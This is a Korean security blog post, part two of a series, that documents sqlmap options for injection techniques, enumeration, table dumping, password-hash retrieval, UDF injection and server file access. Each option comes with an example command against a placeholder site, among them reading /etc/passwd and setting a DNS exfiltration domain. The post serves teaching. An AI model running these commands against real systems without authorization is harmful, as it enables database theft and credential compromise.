---
layout: single
title:  "SQLi-sqlma 옵션 리스트 02"
categories: SQLi
tag: [SQLi, sqlmap, 이론, 옵션]
toc: true
author_profile: false
---

**[공지사항]** [본 블로그에 포함된 모든 정보는 교육 목적으로만 제공됩니다.](https://weoooo.github.io/notice/notice/)
{: .notice--danger}

**[SQLi-sqlma 옵션 리스트 03]**[SQLi-sqlma 옵션 리스트 03로 이동 합니다.](https://weoooo.github.io/sqli/SQLi-sqlmap-otion-03/)
{: .notice--success}

## Techniques 옵션

1. **--technique=TECH**:
   
   **설명**: 사용할 SQL 인젝션 기법을 지정합니다 (기본값 "BEUSTQ").
   {: .notice--danger}
   **사용법**: 특정 인젝션 기법만 사용하고 싶을 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --technique=BEU`
   {: .notice--danger}

2. **--time-sec=TIMESEC**:
   
   **설명**: DBMS 응답 지연 시간을 초 단위로 설정합니다 (기본값 5초).
   {: .notice--danger}
   **사용법**: 타임 베이스드 인젝션 기법을 사용할 때 지연 시간을 설정합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --time-sec=10`
   {: .notice--danger}

3. **--union-cols=UCOLS**:
   
   **설명**: UNION 쿼리 SQL 인젝션을 테스트할 열의 범위를 설정합니다.
   {: .notice--danger}
   **사용법**: UNION 기반 인젝션 테스트 시 열의 개수를 설정합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --union-cols=1-10`
   {: .notice--danger}

4. **--union-char=UCHAR**:
   
   **설명**: 열 개수 브루트포싱에 사용할 문자를 지정합니다.
   {: .notice--danger}
   **사용법**: UNION 기반 인젝션에서 사용할 문자를 설정합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --union-char="1"`
   {: .notice--danger}

5. **--union-from=UFROM**:
   
   **설명**: UNION 쿼리 SQL 인젝션의 FROM 부분에 사용할 테이블을 지정합니다.
   {: .notice--danger}
   **사용법**: UNION 인젝션에서 사용할 테이블을 지정합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --union-from="users"`
   {: .notice--danger}

6. **--dns-domain=DNSDOMAIN**:
   
   **설명**: DNS exfiltration 공격에 사용할 도메인 이름을 지정합니다.
   {: .notice--danger}
   **사용법**: DNS 기반 데이터 exfiltration 공격에 사용할 도메인을 설정합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --dns-domain="example.com"`
   {: .notice--danger}

7. **--second-url=SECONDURL**:
   
   **설명**: 두 번째 URL을 사용하여 응답 페이지를 검색합니다.
   {: .notice--danger}
   **사용법**: 두 번째 URL을 사용하여 SQL 인젝션을 테스트할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --second-url="http://www.secondsite.com"`
   {: .notice--danger}

8. **--second-req=SECONDREQ**:
   
   **설명**: 파일에서 두 번째 HTTP 요청을 로드합니다.
   {: .notice--danger}
   **사용법**: 파일에 저장된 HTTP 요청을 사용하여 두 번째 응답을 테스트합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --second-req="request.txt"`
   {: .notice--danger}

## Fingerprint 옵션

1. **-f, --fingerprint**:
   
   **설명**: DBMS 버전에 대한 광범위한 지문 인식을 수행합니다.
   {: .notice--danger}
   **사용법**: DBMS의 정확한 버전을 식별하고자 할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --fingerprint`
   {: .notice--danger}

## Enumeration 옵션

1. **-a, --all**:
   
   **설명**: 모든 정보를 가져옵니다.
   {: .notice--danger}
   **사용법**: DBMS의 모든 정보를 한 번에 가져올 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" -a`
   {: .notice--danger}

2. **-b, --banner**:
   
   **설명**: DBMS 배너를 가져옵니다.
   {: .notice--danger}
   **사용법**: DBMS의 배너 정보를 가져올 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" -b`
   {: .notice--danger}

3. **--current-user**:
   
   **설명**: 현재 DBMS 사용자를 가져옵니다.
   {: .notice--danger}
   **사용법**: 현재 접속 중인 DBMS 사용자를 식별할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --current-user`
   {: .notice--danger}

4. **--current-db**:
   
   **설명**: 현재 DBMS 데이터베이스를 가져옵니다.
   {: .notice--danger}
   **사용법**: 현재 사용 중인 데이터베이스를 식별할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --current-db`
   {: .notice--danger}

5. **--hostname**:
   
   **설명**: DBMS 서버 호스트 이름을 가져옵니다.
   {: .notice--danger}
   **사용법**: DBMS 서버의 호스트 이름을 식별할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --hostname`
   {: .notice--danger}

6. **--is-dba**:
   
   **설명**: 현재 DBMS 사용자가 DBA인지 확인합니다.
   {: .notice--danger}
   **사용법**: 현재 사용자가 DBA 권한을 가지고 있는지 확인할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --is-dba`
   {: .notice--danger}

7. **--users**:
   
   **설명**: DBMS 사용자들을 열거합니다.
   {: .notice--danger}
   **사용법**: 데이터베이스의 모든 사용자 목록을 가져올 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --users`
   {: .notice--danger}

8. **--passwords**:
   
   **설명**: DBMS 사용자들의 암호 해시를 열거합니다.
   {: .notice--danger}
   **사용법**: 데이터베이스 사용자들의 암호 해시를 가져올 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --passwords`
   {: .notice--danger}

9. **--privileges**:
   
   **설명**: DBMS 사용자들의 권한을 열거합니다.
   {: .notice--danger}
   **사용법**: 사용자별로 할당된 권한을 가져올 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --privileges`
   {: .notice--danger}

10. **--roles**:
    
    **설명**: DBMS 사용자들의 역할을 열거합니다.
    {: .notice--danger}
    **사용법**: 사용자들에게 할당된 역할을 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --roles`
    {: .notice--danger}

11. **--dbs**:
    
    **설명**: DBMS 데이터베이스들을 열거합니다.
    {: .notice--danger}
    **사용법**: 데이터베이스 서버에 있는 모든 데이터베이스 목록을 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --dbs`
    {: .notice--danger}

12. **--tables**:
    
    **설명**: DBMS 데이터베이스의 테이블들을 열거합니다.
    {: .notice--danger}
    **사용법**: 데이터베이스의 테이블 목록을 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --tables`
    {: .notice--danger}

13. **--columns**:
    
    **설명**: DBMS 데이터베이스 테이블의 열들을 열거합니다.
    {: .notice--danger}
    **사용법**: 특정 테이블의 열 목록을 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --columns`
    {: .notice--danger}

14. **--schema**:
    
    **설명**: DBMS 스키마를 열거합니다.
    {: .notice--danger}
    **사용법**: 데이터베이스 스키마 정보를 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --schema`
    {: .notice--danger}

15. **--count**:
    
    **설명**: 테이블 항목의 개수를 가져옵니다.
    {: .notice--danger}
    **사용법**: 특정 테이블의 항목 개수를 확인할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --count`
    {: .notice--danger}

16. **--dump**:
    
    **설명**: DBMS 데이터베이스 테이블 항목을 덤프합니다.
    {: .notice--danger}
    **사용법**: 특정 테이블의 데이터를 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --dump`
    {: .notice--danger}

17. **--dump-all**:
    
    **설명**: 모든 DBMS 데이터베이스 테이블 항목을 덤프합니다.
    {: .notice--danger}
    **사용법**: 모든 데이터베이스의 데이터를 한꺼번에 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --dump-all`
    {: .notice--danger}

18. **--search**:
    
    **설명**: 열, 테이블 및/또는 데이터베이스 이름을 검색합니다.
    {: .notice--danger}
    **사용법**: 특정 이름을 검색하여 해당 열, 테이블 또는 데이터베이스를 식별할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --search -C "user"`
    {: .notice--danger}

19. **--comments**:
    
    **설명**: 열거 중 DBMS 주석을 확인합니다.
    {: .notice--danger}
    **사용법**: 데이터베이스의 주석 정보를 가져올 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --comments`
    {: .notice--danger}

20. **--statements**:
    
    **설명**: DBMS에서 실행 중인 SQL 문을 가져옵니다.
    {: .notice--danger}
    **사용법**: 데이터베이스에서 실행 중인 SQL 문을 확인할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --statements`
    {: .notice--danger}

21. **-D DB**:
    
    **설명**: 열거할 DBMS 데이터베이스를 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 데이터베이스를 지정하여 해당 데이터베이스에 대해 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" -D "mydatabase"`
    {: .notice--danger}

22. **-T TBL**:
    
    **설명**: 열거할 DBMS 데이터베이스 테이블을 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 테이블을 지정하여 해당 테이블에 대해 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" -T "users"`
    {: .notice--danger}

23. **-C COL**:
    
    **설명**: 열거할 DBMS 데이터베이스 테이블 열을 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 열을 지정하여 해당 열에 대해 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" -C "username"`
    {: .notice--danger}

24. **-X EXCLUDE**:
    
    **설명**: 열거하지 않을 DBMS 데이터베이스 식별자를 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 데이터베이스를 제외하고 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" -X "information_schema"`
    {: .notice--danger}

25. **-U USER**:
    
    **설명**: 열거할 DBMS 사용자를 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 사용자를 지정하여 해당 사용자에 대해 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" -U "admin"`
    {: .notice--danger}

26. **--exclude-sysdbs**:
    
    **설명**: 열거할 때 DBMS 시스템 데이터베이스를 제외합니다.
    {: .notice--danger}
    **사용법**: 시스템 데이터베이스를 제외하고 사용자 데이터베이스만 열거할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --exclude-sysdbs`
    {: .notice--danger}

27. **--pivot-column=PIVOTCOLUMN**:
    
    **설명**: 피벗 열 이름을 지정합니다.
    {: .notice--danger}
    **사용법**: 피벗 열을 지정하여 데이터 덤프 시 특정 열을 기준으로 정렬할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --pivot-column="id"`
    {: .notice--danger}

28. **--where=DUMPWHERE**:
    
    **설명**: 테이블 덤프 시 사용할 WHERE 조건을 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 조건에 맞는 데이터만 덤프할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --where="id > 10"`
    {: .notice--danger}

29. **--start=LIMITSTART**:
    
    **설명**: 덤프할 테이블 항목의 첫 번째 항목을 지정합니다.
    {: .notice--danger}
    **사용법**: 덤프할 데이터의 시작 지점을 지정할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --start=100`
    {: .notice--danger}

30. **--stop=LIMITSTOP**:
    
    **설명**: 덤프할 테이블 항목의 마지막 항목을 지정합니다.
    {: .notice--danger}
    **사용법**: 덤프할 데이터의 종료 지점을 지정할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --stop=200`
    {: .notice--danger}

31. **--first=FIRSTCHAR**:
    
    **설명**: 쿼리 출력 단어의 첫 번째 문자를 지정합니다.
    {: .notice--danger}
    **사용법**: 덤프할 데이터의 첫 번째 문자를 지정할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --first=1`
    {: .notice--danger}

32. **--last=LASTCHAR**:
    
    **설명**: 쿼리 출력 단어의 마지막 문자를 지정합니다.
    {: .notice--danger}
    **사용법**: 덤프할 데이터의 마지막 문자를 지정할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --last=100`
    {: .notice--danger}

33. **--sql-query=SQLQUERY**:
    
    **설명**: 실행할 SQL 문을 지정합니다.
    {: .notice--danger}
    **사용법**: 특정 SQL 문을 실행할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --sql-query="SELECT * FROM users"`
    {: .notice--danger}

34. **--sql-shell**:
    
    **설명**: 대화형 SQL 쉘을 엽니다.
    {: .notice--danger}
    **사용법**: SQL 쉘을 통해 직접 명령을 실행할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --sql-shell`
    {: .notice--danger}

35. **--sql-file=SQLFILE**:
    
    **설명**: 지정된 파일에서 SQL 문을 실행합니다.
    {: .notice--danger}
    **사용법**: 파일에 저장된 SQL 문을 실행할 때 사용합니다.
    {: .notice--danger}
    **예제**: `python sqlmap.py -u "http://www.site.com" --sql-file="queries.sql"`
    {: .notice--danger}

## Brute force 옵션

1. **--common-tables**:
   
   **설명**: 일반적인 테이블의 존재 여부를 확인합니다.
   {: .notice--danger}
   **사용법**: 일반적으로 사용되는 테이블 이름을 체크할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --common-tables`
   {: .notice--danger}

2. **--common-columns**:
   
   **설명**: 일반적인 열의 존재 여부를 확인합니다.
   {: .notice--danger}
   **사용법**: 일반적으로 사용되는 열 이름을 체크할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --common-columns`
   {: .notice--danger}

3. **--common-files**:
   
   **설명**: 일반적인 파일의 존재 여부를 확인합니다.
   {: .notice--danger}
   **사용법**: 일반적으로 사용되는 파일 이름을 체크할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --common-files`
   {: .notice--danger}

## 사용자 정의 함수 주입(User-defined function injection):

1. **--udf-inject**:
   
   **설명**: 사용자 정의 함수를 주입합니다.
   {: .notice--danger}
   **사용법**: 이 옵션은 데이터베이스에서 직접 사용할 수 없는 특정 기능을 구현하고자 할 때 사용자 정의 함수를 주입하는 데 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --udf-inject`
   {: .notice--danger}

2. **--shared-lib=SHLIB**:
   
   **설명**: 공유 라이브러리의 로컬 경로를 지정합니다.
   {: .notice--danger}
   **사용법**: 주입할 사용자 정의 함수가 포함된 공유 라이브러리 파일의 경로를 지정할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --shared-lib="/path/to/shared/lib.so"`
   {: .notice--danger}

## 파일 시스템 접근(File system access)

1. **--file-read=FILE**:
   
   **설명**: 백엔드 DBMS 파일 시스템에서 파일을 읽습니다.
   {: .notice--danger}
   **사용법**: 데이터베이스 서버에서 특정 파일의 내용을 읽고자 할 때 사용합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --file-read="/etc/passwd"`
   {: .notice--danger}

2. **--file-write=FILE**:
   
   **설명**: 로컬 파일을 백엔드 DBMS 파일 시스템에 씁니다.
   {: .notice--danger}
   **사용법**: 로컬 파일을 데이터베이스 서버의 파일 시스템에 쓰고자 할 때 사용합니다. 이 옵션은 --file-dest 옵션과 함께 사용해야 합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --file-write="/path/to/local/file"`
   {: .notice--danger}

3. **--file-dest=FILE**:
   
   **설명**: 파일을 쓸 백엔드 DBMS 절대 파일 경로를 지정합니다.
   {: .notice--danger}
   **사용법**: 파일을 쓸 위치를 지정할 때 사용합니다. 이 옵션은 --file-write 옵션과 함께 사용해야 합니다.
   {: .notice--danger}
   **예제**: `python sqlmap.py -u "http://www.site.com" --file-write="/path/to/local/file" --file-dest="/path/on/dbms/system"`
   {: .notice--danger}

## 📖Reference

[Usage · sqlmapproject/sqlmap Wiki · GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
